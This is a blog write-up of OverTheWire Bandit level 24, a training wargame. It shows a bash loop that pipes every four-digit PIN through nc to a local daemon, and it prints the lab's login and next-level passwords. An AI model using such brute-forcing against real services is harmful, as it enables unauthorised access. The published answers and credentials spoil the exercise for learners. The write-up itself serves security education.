+++
author = "Alex Domnit"
title = 'Bandit-Level 24'
date = 2024-08-18T20:29:04+03:00
draft = false
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "Overthewire",
    "Bandit",
]

toc = false
+++

# Level goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.\
You do not need to create new connections each time.

### Login
*ssh bandit24@bandit.labs.overthewire.org -p 2220*\
*gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8*

### Doc
{{< highlight html >}}
nc (1)               - arbitrary TCP and UDP connections and listens
{{< /highlight >}}

### Articles
[Usefull read if you are new to bash scripting](https://www.geeksforgeeks.org/bash-scripting-introduction-to-bash-and-bash-scripting/)\
[File permissions](https://www.redhat.com/sysadmin/linux-file-permissions-explained)

### Solution
We will write a bash script again since we need to repeatedly send request and we wouldn`t want to do that by hand. Create a temp dir **mktemp -d** and **touch** a file and give it execute rights.
#### My script:
{{< highlight html >}}
#!/bin/bash


for a  in {0000..9999}
do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $a";
done | nc localhost 30002 > keys.txt

cat keys.txt | grep bandit25
{{< /highlight >}}

#### Script breakdown

For a variable **a** in the range of 0000 and 9999, we are gonna **echo** the current password and **$a**(values of a) and pipe it to the daemon on port 30002 since you can\`t open **nc** before the loop without it waiting for a kill before letting the loop do the parsing.  The ouput of all of this will be ouput into keys.txt. The **grep** doesn\`t matter since the daemon breaks either way when inserting the correct value.

{{< highlight html >}}
bandit24@bandit:/tmp/tmp.dxMibZCdBZ$ ./script.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
{{< /highlight >}}